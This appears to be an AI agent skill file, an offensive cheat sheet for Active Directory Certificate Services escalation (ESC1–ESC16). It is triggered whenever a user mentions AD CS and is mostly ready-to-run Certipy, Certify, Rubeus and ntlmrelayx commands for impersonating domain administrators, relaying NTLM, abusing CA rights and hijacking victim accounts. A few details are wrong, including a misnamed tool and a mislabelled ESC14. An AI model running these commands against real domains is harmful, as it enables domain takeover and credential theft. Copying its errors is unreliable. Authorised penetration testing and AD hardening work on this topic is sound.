---
name: adcs-domain-escalation
description: Active Directory Certificate Services (AD CS) domain escalation techniques. Use this skill whenever the user mentions AD CS, certificate templates, ESC vulnerabilities, PKI misconfigurations, certificate-based authentication attacks, or wants to enumerate/exploit certificate authority weaknesses in Active Directory environments. This covers ESC1-ESC16 techniques including misconfigured templates, enrollment agent abuse, access control issues, NTLM relay to AD CS, and certificate mapping vulnerabilities.
---

# AD CS Domain Escalation Techniques

This skill covers Active Directory Certificate Services (AD CS) privilege escalation techniques (ESC1-ESC16) for security assessments and penetration testing.

## Prerequisites & Tools

### Required Tools
- **Certipy** (Python): `pip install certipy`
- **Certify** (C#): [GhostPack/Certify](https://github.com/GhostPack/Certify)
- **Rubeus** (C#): [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- **PSPKI** (PowerShell): For CA management

### Basic Enumeration
```bash
# Find vulnerable templates and CAs
certipy find -username user@domain.local -password Pass -dc-ip 10.0.0.100
certify.exe find /vulnerable
certify.exe find /showAllPermissions

# List CAs and their properties
certipy ca -username user@domain.local -password Pass -target-ip ca.domain.local -ca 'CA-NAME'
```

---

## ESC1: Misconfigured Certificate Templates (Enrollee Supplies Subject)

### Vulnerability
Templates allow low-privileged users to request certificates with arbitrary Subject Alternative Names (SAN), enabling impersonation of any domain principal.

### Requirements
- Enrollment rights granted to low-privileged users
- No manager approval required
- No authorized signatures needed
- EKU includes Client Authentication, PKINIT, Smart Card Logon, Any Purpose, or no EKU
- `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag enabled

### Detection
```bash
# Certipy
certipy find -username user@domain.local -password Pass -dc-ip 10.0.0.100

# Certify
certify.exe find /vulnerable

# LDAP query
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```

### Exploitation
```bash
# Request certificate with target SAN
certipy req -username user@domain.local -password Pass -ca 'CA-NAME' -target ca.domain.local -template 'VulnTemplate' -upn 'administrator@domain.local'

# With SID pinning (post-2022)
certipy req -username user@domain.local -password Pass -ca 'CA-NAME' -target ca.domain.local -template 'VulnTemplate' -upn 'administrator' -sid 'S-1-5-21-...-500'

# Certify equivalent
certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@domain.local

# Authenticate with certificate
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'domain.local' -dc-ip 10.0.0.100
rubeus.exe asktgt /user:domain /certificate:administrator.pfx /ptt
```

---

## ESC2: Any Purpose EKU or No EKU

### Vulnerability
Templates with Any Purpose EKU (OID 2.5.29.37.0) or no EKU can be used for any purpose, including authentication.

### Detection
```bash
# LDAP query for ESC2 templates
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```

### Exploitation
Same as ESC1 - request certificate and use for authentication.

---

## ESC3: Enrollment Agent Template Abuse

### Vulnerability
Certificate Request Agent EKU (OID 1.3.6.1.4.1.311.20.2.1) allows enrolling certificates on behalf of other users.

### Requirements
1. Enrollment agent template accessible to low-privileged users
2. Target template allows "enroll on behalf of"
3. CA does not restrict enrollment agents (default setting)

### Exploitation
```bash
# Step 1: Request enrollment agent certificate
certipy req -username user@domain.local -password Pass -ca 'CA-NAME' -target ca.domain.local -template 'EnrollmentAgent'

# Step 2: Request certificate on behalf of target
certipy req -username user@domain.local -password Pass -ca 'CA-NAME' -target ca.domain.local -template 'User' -on-behalf-of 'domain\administrator' -pfx 'agent.pfx'

# Certify equivalent
certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:DOMAIN\administrator /enrollment:agent.pfx /enrollcertpwd:password

# Authenticate
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'domain.local'
```

---

## ESC4: Vulnerable Certificate Template Access Control

### Vulnerability
Users with write permissions on certificate templates can modify them to create ESC1 vulnerabilities.

### Permissions to Check
- Owner
- FullControl
- WriteOwner
- WriteDacl
- WriteProperty

### Detection
```bash
certify.exe find /showAllPermissions
certify.exe pkiobjects /domain:domain.local /showAdmins
```

### Exploitation
```bash
# Modify template to be vulnerable (saves old config)
certipy template -username user@domain.local -password Pass -template 'TargetTemplate' -save-old

# Exploit the modified template
certipy req -username user@domain.local -password Pass -ca 'CA-NAME' -target ca.domain.local -template 'TargetTemplate' -upn 'administrator@domain.local'

# Restore original configuration
certipy template -username user@domain.local -password Pass -template 'TargetTemplate' -configuration 'TargetTemplate.json'
```

### Shadow Credentials (Related)
```bash
# If you have AddKeyCredentialLink on a computer account
certipy shadow auto 'domain.local/user:Pass@dc.domain.local' -account 'targetcomputer'
```

---

## ESC5: Vulnerable PKI Object Access Control

### Vulnerability
Excessive permissions on PKI objects beyond templates (CA server object, containers, NTAuthCertificates).

### Objects to Check
- CA server computer object
- `CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local`
- Certificate Templates container
- Certification Authorities container
- NTAuthCertificates object
- Enrollment Services Container

### Detection
```bash
certify.exe pkiobjects /domain:domain.local /showAdmins
```

---

## ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 Flag

### Vulnerability
CA flag allows user-defined SAN values in any template request, including standard User template.

### Detection
```bash
# Check EditFlags registry value
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"

# Or via remote registry
reg.exe query \\CA_SERVER\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\CA_NAME\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags

# Certipy/Certify detection
certipy find -username user@domain.local -password Pass -dc-ip 10.0.0.100
certify.exe find
```

### Exploitation
```bash
# Request certificate with arbitrary SAN
certipy req -username user@domain.local -password Pass -ca 'CA-NAME' -target ca.domain.local -template 'User' -upn 'administrator@domain.local'

certify.exe request /ca:dc.domain.local\CA-NAME /template:User /altname:administrator
```

### Mitigation
```bash
# Disable the flag (requires domain admin)
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```

> **Note**: Post-May 2022 updates add SID security extension. ESC6 requires ESC10 (Weak Certificate Mappings) to be effective.

---

## ESC7: Vulnerable Certificate Authority Access Control

### Attack 1: ManageCA/ManageCertificates Rights

#### ManageCA
- Can modify CA settings remotely
- Can enable `EDITF_ATTRIBUTESUBJECTALTNAME2` (ESC6)
- Can restart CA service

#### ManageCertificates
- Can approve pending certificate requests
- Can issue failed requests

### Detection
```powershell
# PSPKI module
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```

### Exploitation
```bash
# Request certificate requiring approval
certify.exe request /ca:dc.domain.local\CA-NAME /template:ApprovalNeeded

# Approve via PSPKI
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 123 | Approve-CertificateRequest

# Download certificate
certify.exe download /ca:dc.domain.local\CA-NAME /id:123
```

### Attack 2: SubCA Template Abuse
```bash
# Add yourself as officer
certipy ca -ca 'CA-NAME' -add-officer username -username user@domain.local -password Pass

# Enable SubCA template
certipy ca -ca 'CA-NAME' -enable-template SubCA -username user@domain.local -password Pass

# Request SubCA certificate (will fail but saves private key)
certipy req -username user@domain.local -password Pass -ca 'CA-NAME' -target ca.domain.local -template SubCA -upn 'administrator@domain.local'
# Note the Request ID and save the private key

# Issue the failed request
certipy ca -ca 'CA-NAME' -issue-request 123 -username user@domain.local -password Pass

# Retrieve the certificate
certipy req -username user@domain.local -password Pass -ca 'CA-NAME' -target ca.domain.local -retrieve 123
```

### Attack 3: SetExtension Abuse (Manage Certificates Only)
```bash
# Submit pending request
certify.exe request --ca SERVER\CA-NAME --template SecureUser --subject "CN=User" --manager-approval

# Append custom extension
certify.exe manage-ca --ca SERVER\CA-NAME --request-id 123 --set-extension "1.1.1.1=DER,10,01 01 00 00"

# Issue and download
certify.exe request-download --ca SERVER\CA-NAME --id 123
```

---

## ESC8: NTLM Relay to AD CS HTTP Endpoints

### Vulnerability
HTTP-based enrollment endpoints vulnerable to NTLM relay attacks.

### Detection
```bash
# Find HTTP endpoints
certify.exe cas

# Via certutil
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA

# Via PSPKI
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```

### Exploitation
```bash
# Certipy relay
certipy relay -ca ca.domain.local -template User

# With PetitPotam for authentication coercion
certipy relay -ca ca.domain.local -coerce

# Impacket ntlmrelayx
proxychains ntlmrelayx.py -t http://<CA_IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server
```

---

## ESC9: No Security Extension (CT_FLAG_NO_SECURITY_EXTENSION)

### Vulnerability
Template flag prevents SID security extension embedding, enabling UPN-based impersonation.

### Requirements
- `StrongCertificateBindingEnforcement` = 1 (default)
- Template has `CT_FLAG_NO_SECURITY_EXTENSION` flag
- Client authentication EKU present
- GenericWrite on victim account

### Exploitation
```bash
# Step 1: Get victim hash via Shadow Credentials
certipy shadow auto -username attacker@domain.local -password Pass -account victim

# Step 2: Modify victim UPN to target
certipy account update -username attacker@domain.local -password Pass -user victim -upn Administrator

# Step 3: Request certificate as victim
certipy req -username victim@domain.local -hashes <hash> -ca 'CA-NAME' -template 'ESC9-Template'

# Step 4: Restore victim UPN
certipy account update -username attacker@domain.local -password Pass -user victim -upn victim@domain.local

# Step 5: Authenticate as target
certipy auth -pfx administrator.pfx -domain domain.local
```

---

## ESC10: Weak Certificate Mappings

### Vulnerability
Domain controller registry settings allow certificate-based authentication without proper SID binding.

### Registry Keys
- `CertificateMappingMethods` (default 0x18, previously 0x1F)
- `StrongCertificateBindingEnforcement` (default 1, previously 0)

### Case 1: StrongCertificateBindingEnforcement = 0
Same exploitation as ESC9 - any template works.

### Case 2: CertificateMappingMethods includes UPN bit (0x4)
```bash
# Target account without UPN (e.g., machine account)
certipy shadow auto -username attacker@domain.local -password Pass -account victim

certipy account update -username attacker@domain.local -password Pass -user victim -upn 'DC$@domain.local'

certipy req -ca 'CA-NAME' -username victim@domain.local -hashes <hash>

certipy account update -username attacker@domain.local -password Pass -user victim -upn 'victim@domain.local'

# Authenticate via LDAP shell
certipy auth -pfx dc.pfx -dc-ip 10.0.0.100 -ldap-shell
```

---

## ESC11: Relaying NTLM to ICPR (RPC)

### Vulnerability
CA not configured with `IF_ENFORCEENCRYPTICERTREQUEST` allows NTLM relay via RPC.

### Detection
```bash
certipy find -username user@domain.local -password Pass -dc-ip 10.0.0.100 -stdout
# Look for "Enforce Encryption for Requests: Disabled"
```

### Exploitation
```bash
# Certipy
certipy relay -target 'rpc://DC01.domain.local' -ca 'CA-NAME' -dc-ip 10.0.0.100

# Impacket
tlmrelayx.py -t rpc://10.0.0.100 -rpc-mode ICPR -icpr-ca-name CA-NAME -smb2support
```

---

## ESC12: Shell Access to ADCS CA with YubiHSM

### Vulnerability
CA private key stored on YubiHSM with cleartext authentication key in registry.

### Exploitation
```cmd
# Import CA certificate
certutil -addstore -user my <CA_certificate_file>

# Associate with YubiHSM private key
certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA_Common_Name>

# Sign arbitrary certificate
certutil -sign <request_file> <output_file>
```

---

## ESC13: OID Group Link Abuse

### Vulnerability
OID objects link certificates to AD groups via `msDS-OIDToGroupLink`.

### Detection
```bash
# Check-ADCSESC13.ps1 script
# Or manually check OID objects in:
# CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
```

### Exploitation
```bash
# Request certificate from template with OID group link
certipy req -username user@domain.local -password Pass -dc-ip 10.0.0.100 -target 'CA.domain.local' -ca 'CA-NAME' -template 'VulnerableTemplate'

# Certificate grants group membership implicitly
```

---

## ESC14: Vulnerable Certificate Renewal Configuration

### Vulnerability
Weak `altSecurityIdentities` mappings allow certificate-based impersonation.

### Weak Mapping Examples
- `X509:<S>CN=SomeUser` (common CN only)
- `X509:<I>CN=SomeInternalCA<S>CN=GenericUser` (generic DN)
- `X509:<RFC822>EmailAddress` (email-based)

### Exploitation Scenarios

#### Scenario A: Write to altSecurityIdentities
```bash
# Request certificate
certify.exe request /ca:CA-NAME /template:Machine /machine

# Convert to PFX
certutil -MergePFX certificate.pem certificate.pfx

# Authenticate
certify.exe asktgt /user:target /certificate:certificate.pfx /nowrap
```

#### Scenario B: Weak X509RFC822 Mapping
- Set victim's mail attribute to match target's mapping
- Enroll certificate as victim
- Authenticate as target

---

## ESC15: EKUwu Application Policies (CVE-2024-49019)

### Vulnerability
V1 templates allow injection of application policies overriding template EKU.

### Detection
```bash
certipy find -username user@domain.local -password Pass -dc-ip 10.0.0.100
# Look for V1 templates with "Enrollee supplies subject"
```

### Exploitation
```bash
# Direct impersonation via Schannel
certipy req -u 'attacker@domain.local' -p 'Pass' -dc-ip '10.0.0.100' -target 'CA.domain.local' -ca 'CA-NAME' -template 'WebServer' -upn 'administrator@domain.local' -sid 'S-1-5-21-...-500' -application-policies 'Client Authentication'

# Authenticate
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell

# Via Enrollment Agent abuse
certipy req -u 'attacker@domain.local' -p 'Pass' -dc-ip '10.0.0.100' -target 'CA.domain.local' -ca 'CA-NAME' -template 'WebServer' -application-policies 'Certificate Request Agent'

certipy req -u 'attacker@domain.local' -p 'Pass' -dc-ip '10.0.0.100' -target 'CA.domain.local' -ca 'CA-NAME' -template 'User' -pfx 'attacker.pfx' -on-behalf-of 'DOMAIN\Administrator'
```

---

## ESC16: Security Extension Disabled on CA (Globally)

### Vulnerability
CA configured to omit SID security extension from all certificates.

### Detection
```bash
certipy find -username user@domain.local -password Pass -dc-ip 10.0.0.100 -stdout -vulnerable
```

### Exploitation
```bash
# Step 1: Read victim UPN (for restoration)
certipy account -u 'attacker@domain.local' -p 'Pass' -dc-ip '10.0.0.100' -user 'victim' read

# Step 2: Update victim UPN to target sAMAccountName
certipy account -u 'attacker@domain.local' -p 'Pass' -dc-ip '10.0.0.100' -upn 'administrator' -user 'victim' update

# Step 3: Get victim credentials (Shadow Credentials)
certipy shadow -u 'attacker@domain.local' -p 'Pass' -dc-ip '10.0.0.100' -account 'victim' auto

# Step 4: Request certificate (any client auth template)
export KRB5CCNAME=victim.ccache
certipy req -k -dc-ip '10.0.0.100' -target 'CA.domain.local' -ca 'CA-NAME' -template 'User'

# Step 5: Restore victim UPN
certipy account -u 'attacker@domain.local' -p 'Pass' -dc-ip '10.0.0.100' -upn 'victim@domain.local' -user 'victim' update

# Step 6: Authenticate as target
certipy auth -dc-ip '10.0.0.100' -pfx 'administrator.pfx' -username 'administrator' -domain 'domain.local'
```

---

## Cross-Forest Considerations

### Breaking Forest Trusts
- Root CA from resource forest published to account forests
- Enterprise CA certificates in `NTAuthCertificates` and AIA containers
- Compromised CA can forge certificates for all forests

### Foreign Principal Enrollment
- Templates allowing `Authenticated Users` enrollment accessible across trusts
- Explicit enrollment rights to foreign principals create cross-forest attack paths

---

## Quick Reference

| ESC | Vulnerability | Key Tool | Primary Command |
|-----|--------------|----------|----------------|
| 1 | Enrollee supplies subject | certipy | `req -template X -upn target` |
| 2 | Any Purpose EKU | certipy | Same as ESC1 |
| 3 | Enrollment Agent | certipy | `req -on-behalf-of target` |
| 4 | Template write access | certipy | `template -save-old` |
| 5 | PKI object ACLs | certify | `pkiobjects /showAdmins` |
| 6 | EDITF flag | certipy | `req -template User -upn target` |
| 7 | CA management rights | certipy | `ca -issue-request` |
| 8 | NTLM relay HTTP | certipy | `relay -ca CA` |
| 9 | No security extension | certipy | `shadow + account update + req` |
| 10 | Weak mappings | certipy | Same as ESC9 |
| 11 | NTLM relay RPC | certipy | `relay -target rpc://` |
| 12 | YubiHSM access | certutil | `-csp YubiHSM` |
| 13 | OID group links | certipy | `req -template X` |
| 14 | altSecurityIdentities | certify | Various scenarios |
| 15 | EKUwu (CVE-2024-49019) | certipy | `req -application-policies` |
| 16 | Global security extension | certipy | Same as ESC9 |

---

## References

- [Certipy Wiki - Privilege Escalation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [Certify 2.0 - SpecterOps](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [Certified Pre-Owned - SpecterOps](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

---

> **Legal Notice**: These techniques are for authorized security assessments only. Always obtain proper authorization before testing AD CS configurations.
